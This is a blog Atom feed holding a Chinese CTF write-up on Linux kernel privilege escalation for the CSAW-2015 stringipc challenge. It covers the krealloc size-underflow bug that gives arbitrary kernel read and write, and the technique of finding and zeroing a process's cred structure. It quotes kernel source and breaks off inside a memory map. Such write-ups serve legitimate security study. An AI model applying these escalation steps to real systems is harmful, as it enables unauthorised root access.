<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>p4nda&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://p4nda.top/"/>
  <updated>2018-11-07T08:32:19.174Z</updated>
  <id>http://p4nda.top/</id>
  
  <author>
    <name>P4nda</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【KERNEL PWN】从内存任意读写到权限提升</title>
    <link href="http://p4nda.top/2018/11/07/stringipc/"/>
    <id>http://p4nda.top/2018/11/07/stringipc/</id>
    <published>2018-11-07T08:30:19.000Z</published>
    <updated>2018-11-07T08:32:19.174Z</updated>
    
    <content type="html"><![CDATA[<p>本篇主要以CSAW-2015-CTF的stringipc题目为例，分析了三种从内存任意读写到权限提升的利用方法。本人学习KERNEL PWN的时间也较短，如有差错，请指正。</p><h1 id="0-环境搭建与题目分析"><a href="#0-环境搭建与题目分析" class="headerlink" title="0 环境搭建与题目分析"></a>0 环境搭建与题目分析</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>题目环境由于比赛时间过去很久了，没有找到，所以选择自行编译。</p><p>内核源码我选择了<a href="https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.4.110.tar.gz" target="_blank" rel="noopener">linux-4.4.110版本</a>。<br>busybox采用<a href="https://busybox.net/downloads/busybox-1.21.1.tar.bz2" target="_blank" rel="noopener">1.21.1版本</a>。<br>stringipc的题目源码可以在<a href="https://github.com/mncoppola/StringIPC/blob/master/main.c" target="_blank" rel="noopener">这里</a>找到。<br>源码及busybox编译可以参考<a href="https://www.anquanke.com/post/id/85837" target="_blank" rel="noopener">这篇文章</a>进行编译，我就不赘述了。</p><p>将stringipc的源码，放在内核源码目录下，并编写Makefile文件，执行make就可以编译成为符合内核源码的驱动文件string.ko。<br>相关环境及题目文件可在<a href="https://github.com/ret2p4nda/kernel-pwn" target="_blank" rel="noopener">此处</a>下载</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目主要维护了一块由kzalloc(sizeof(*channel), GFP_KERNEL)创建的内存块，并可对内存块读、写、扩展或缩小。<br>此题漏洞存在于对漏洞扩展的函数realloc_ipc_channel中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">realloc_ipc_channel</span> <span class="params">( struct ipc_state *state, <span class="keyword">int</span> id, <span class="keyword">size_t</span> size, <span class="keyword">int</span> grow )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_channel</span> *<span class="title">channel</span>;</span></span><br><span class="line">    <span class="keyword">size_t</span> new_size;</span><br><span class="line">    <span class="keyword">char</span> *new_data;</span><br><span class="line"></span><br><span class="line">    channel = get_channel_by_id(state, id);</span><br><span class="line">    <span class="keyword">if</span> ( IS_ERR(channel) )</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( grow )</span><br><span class="line">        new_size = channel-&gt;buf_size + size;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        new_size = channel-&gt;buf_size - size;</span><br><span class="line"></span><br><span class="line">    new_data = krealloc(channel-&gt;data, new_size + <span class="number">1</span>, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> ( new_data == <span class="literal">NULL</span> )</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    channel-&gt;data = new_data;</span><br><span class="line">    channel-&gt;buf_size = new_size;</span><br><span class="line"></span><br><span class="line">    ipc_channel_put(state, channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当krealloc返回值不为0时，可以通过验证，将返回值作为内存块起始地址。而krealloc(mm\slab_common.c 1225)在实现中有一个不为0的错误代码ZERO_SIZE_PTR</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * krealloc - reallocate memory. The contents will remain unchanged.</span></span><br><span class="line"><span class="comment"> * @p: object to reallocate memory for.</span></span><br><span class="line"><span class="comment"> * @new_size: how many bytes of memory are required.</span></span><br><span class="line"><span class="comment"> * @flags: the type of memory to allocate.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The contents of the object pointed to are preserved up to the</span></span><br><span class="line"><span class="comment"> * lesser of the new and old sizes.  If @p is %NULL, krealloc()</span></span><br><span class="line"><span class="comment"> * behaves exactly like kmalloc().  If @new_size is 0 and @p is not a</span></span><br><span class="line"><span class="comment"> * %NULL pointer, the object pointed to is freed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">krealloc</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *p, <span class="keyword">size_t</span> new_size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!new_size)) &#123;</span><br><span class="line">kfree(p);</span><br><span class="line"><span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = __do_krealloc(p, new_size, flags);</span><br><span class="line"><span class="keyword">if</span> (ret &amp;&amp; p != ret)</span><br><span class="line">kfree(p);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(krealloc);</span><br></pre></td></tr></table></figure><p>而ZERO_SIZE_PTR定义在include\linux\slab.h 101</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZERO_SIZE_PTR ((void *)16)</span></span><br></pre></td></tr></table></figure><p>可知，当new_size = 0时，可返回该值，而构造该值时由于并没有对传入的size进行检查，恰好new_size = 0 - 1 ，即为0xffffffffffffffff，而此后的检测所定义的size值均为size_t 即unsize long long。所以通过题目中给出的seek、read、write功能就可以对内核及用户态地址任意读写。</p><h1 id="1-修改cred结构提升权限"><a href="#1-修改cred结构提升权限" class="headerlink" title="1 修改cred结构提升权限"></a>1 修改cred结构提升权限</h1><h2 id="cred结构体"><a href="#cred结构体" class="headerlink" title="cred结构体"></a>cred结构体</h2><p>提及cred结构，做过权限提升的同学都不会陌生。这个结构体是用来标注某线程权限的结构体。</p><p>首先，每一个线程在内核中都对应一个线程栈、一个线程结构块thread_info去调度，结构体里面同时也包含了线程的一系列信息。</p><p>该thread_info结构体存放在线程栈的最低地址，对应的结构体定义(\arch\x86\include\asm\thread_info.h 55)是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>*<span class="title">task</span>;</span><span class="comment">/* main task structure */</span></span><br><span class="line">__u32flags;<span class="comment">/* low level flags */</span></span><br><span class="line">__u32status;<span class="comment">/* thread synchronous flags */</span></span><br><span class="line">__u32cpu;<span class="comment">/* current CPU */</span></span><br><span class="line"><span class="keyword">mm_segment_t</span>addr_limit;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>sig_on_uaccess_error:<span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>uaccess_err:<span class="number">1</span>;<span class="comment">/* uaccess failed */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而在thread_info里，包含最重要信息的是task_struct结构体，定义在(\include\linux\sched.h 1390)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">裁剪过后 </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">long</span> state;<span class="comment">/* -1 unrunnable, 0 runnable, &gt;0 stopped */</span></span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">stack</span>;</span><br><span class="line"><span class="keyword">atomic_t</span> usage;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags;<span class="comment">/* per process flags, defined below */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ptrace;</span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line"><span class="comment">/* process credentials */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">ptracer_cred</span>;</span> <span class="comment">/* Tracer's credentials at attach */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">real_cred</span>;</span> <span class="comment">/* objective and real subjective task</span></span><br><span class="line"><span class="comment"> * credentials (COW) */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">cred</span>;</span><span class="comment">/* effective (overridable) subjective task</span></span><br><span class="line"><span class="comment"> * credentials (COW) */</span></span><br><span class="line"><span class="keyword">char</span> comm[TASK_COMM_LEN]; <span class="comment">/* executable name excluding path</span></span><br><span class="line"><span class="comment">     - access with [gs]et_task_comm (which lock</span></span><br><span class="line"><span class="comment">       it with task_lock())</span></span><br><span class="line"><span class="comment">     - initialized normally by setup_new_exec */</span></span><br><span class="line"><span class="comment">/* file system info */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nameidata</span> *<span class="title">nameidata</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSVIPC</span></span><br><span class="line"><span class="comment">/* ipc stuff */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sysv_sem</span> <span class="title">sysvsem</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sysv_shm</span> <span class="title">sysvshm</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">... ... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而其中，cred结构体(\include\linux\cred.h 118)表示的就是这个线程的权限。只要将这个结构的uid~fsgid全部覆写为0就可以把这个线程权限提升为root（root uid为0）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line"><span class="keyword">atomic_t</span>usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line"><span class="keyword">atomic_t</span>subscribers;<span class="comment">/* number of processes subscribed */</span></span><br><span class="line"><span class="keyword">void</span>*put_addr;</span><br><span class="line"><span class="keyword">unsigned</span>magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">kuid_t</span>uid;<span class="comment">/* real UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>gid;<span class="comment">/* real GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>suid;<span class="comment">/* saved UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>sgid;<span class="comment">/* saved GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>euid;<span class="comment">/* effective UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>egid;<span class="comment">/* effective GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>fsuid;<span class="comment">/* UID for VFS ops */</span></span><br><span class="line"><span class="keyword">kgid_t</span>fsgid;<span class="comment">/* GID for VFS ops */</span></span><br><span class="line"><span class="keyword">unsigned</span>securebits;<span class="comment">/* SUID-less security management */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_permitted;<span class="comment">/* caps we're permitted */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_effective;<span class="comment">/* caps we can actually use */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_bset;<span class="comment">/* capability bounding set */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_ambient;<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>jit_keyring;<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment"> * keys to */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">void</span>*security;<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span><span class="comment">/* real user ID subscription */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span><span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个结构体在线程初始化由prepare_creds函数创建，可以看到创建cred的方法是kmem_cache_alloc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct cred *<span class="title">prepare_creds</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> = <span class="title">current</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">validate_process_creds();</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">kdebug(<span class="string">"prepare_creds() alloc %p"</span>, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">old = task-&gt;cred;</span><br><span class="line"><span class="built_in">memcpy</span>(<span class="keyword">new</span>, old, <span class="keyword">sizeof</span>(struct cred));</span><br><span class="line"></span><br><span class="line">atomic_set(&amp;<span class="keyword">new</span>-&gt;usage, <span class="number">1</span>);</span><br><span class="line">set_cred_subscribers(<span class="keyword">new</span>, <span class="number">0</span>);</span><br><span class="line">get_group_info(<span class="keyword">new</span>-&gt;group_info);</span><br><span class="line">get_uid(<span class="keyword">new</span>-&gt;user);</span><br><span class="line">get_user_ns(<span class="keyword">new</span>-&gt;user_ns);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;session_keyring);</span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;process_keyring);</span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;thread_keyring);</span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;request_key_auth);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">new</span>-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (security_prepare_creds(<span class="keyword">new</span>, old, GFP_KERNEL) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line">validate_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span>;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">abort_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(prepare_creds);</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这种漏洞利用方法非常简单粗暴，即利用内存任意读找到cred结构体，再利用内存任意写，将用于表示权限的数据位写为0，就可以完成提权。</p><p>那如何找到这个结构体呢？在task_struct里有一个    char comm[TASK_COMM_LEN]; 结构，而这个结构可以通过prctl函数中的PR_SET_NAME功能，设置为一个小于16字节的字符串。<a href="http://man7.org/linux/man-pages/man2/prctl.2.html" target="_blank" rel="noopener">文档</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PR_SET_NAME (since Linux 2.6.9)</span><br><span class="line">       Set the name of the calling thread, using the value in the</span><br><span class="line">       location pointed to by (char *) arg2.  The name can be up to</span><br><span class="line">       16 bytes long, including the terminating null byte.  (If the</span><br><span class="line">       length of the string, including the terminating null byte,</span><br><span class="line">       exceeds 16 bytes, the string is silently truncated.)  This is</span><br><span class="line">       the same attribute that can be set via pthread_setname_np(3)</span><br><span class="line">       and retrieved using pthread_getname_np(3).  The attribute is</span><br><span class="line">       likewise accessible via /proc/self/task/[tid]/comm, where tid</span><br><span class="line">       is the name of the calling thread.</span><br></pre></td></tr></table></figure><p>而通过设定这个值，并利用内存任意读即可找到这个预设的字符串，即可找到task_structure结构体，进一步找到cred结构体，就可以利用内存任意写来提权了。</p><p>还有一个问题是，爆破的范围如何确定？这涉及到了如何得到一个task_struct，同样是kmem_cache_alloc_node，因此task_struct应该存在内核的动态分配区域。<br>(\kernel\fork.c 140)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct task_struct *<span class="title">alloc_task_struct_node</span><span class="params">(<span class="keyword">int</span> node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> kmem_cache_alloc_node(task_struct_cachep, GFP_KERNEL, node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据内存映射图，爆破范围应该在0xffff880000000000~0xffffc80000000000</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">0xffffffffffffffff  ---+-----------+-----------------------------------------------+-------------+</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    8M                 |           | unused hole                                   |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">0xffffffffff7ff000  ---|-----------+------------| FIXADDR_TOP |--------------------|+++++++++++++|</span><br><span class="line">    1M                 |           |                                               |+++++++++++++|</span><br><span class="line">0xffffffffff600000  ---+-----------+------------| VSYSCALL_ADDR |------------------|+++++++++++++|</span><br><span class="line">    548K               |           | vsyscalls                                     |+++++++++++++|</span><br><span class="line">0xffffffffff577000  ---+-----------+------------| FIXADDR_START |------------------|+++++++++++++|</span><br><span class="line">    5M                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffffffff000000  ---+-----------+------------| MODULES_END |--------------------|+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    1520M              |           | module mapping space (MODULES_LEN)            |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">0xffffffffa0000000  ---+-----------+------------| MODULES_VADDR |------------------|+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">    512M               |           | kernel text mapping, from phys 0              |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">0xffffffff80000000  ---+-----------+------------| __START_KERNEL_map |-------------|+++++++++++++|</span><br><span class="line">    2G                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffffff00000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    64G                |           | EFI region mapping space                      |+++++++++++++|</span><br><span class="line">0xffffffef00000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    444G               |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffff8000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    16T                |           | %esp fixup stacks                             |+++++++++++++|</span><br><span class="line">0xffffff0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    3T                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xfffffc0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    16T                |           | kasan shadow memory (16TB)                    |+++++++++++++|</span><br><span class="line">0xffffec0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">    1T                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffeb0000000000  ---+-----------+-----------------------------------------------| kernel space|</span><br><span class="line">    1T                 |           | virtual memory map for all of struct pages    |+++++++++++++|</span><br><span class="line">0xffffea0000000000  ---+-----------+------------| VMEMMAP_START |------------------|+++++++++++++|</span><br><span class="line">    1T                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffe90000000000  ---+-----------+------------| VMALLOC_END   |------------------|+++++++++++++|</span><br><span class="line">    32T                |           | vmalloc/ioremap (1 &lt;&lt; VMALLOC_SIZE_TB)        |+++++++++++++|</span><br><span class="line">0xffffc90000000000  ---+-----------+------------| VMALLOC_START |------------------|+++++++++++++|</span><br><span class="line">    1T                 |           | hole                                          |+++++++++++++|</span><br><span class="line">0xffffc80000000000  ---+-----------+-----------------------------------------------|+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                                               |+++++++++++++|</span><br><span class="line">                       |           |                    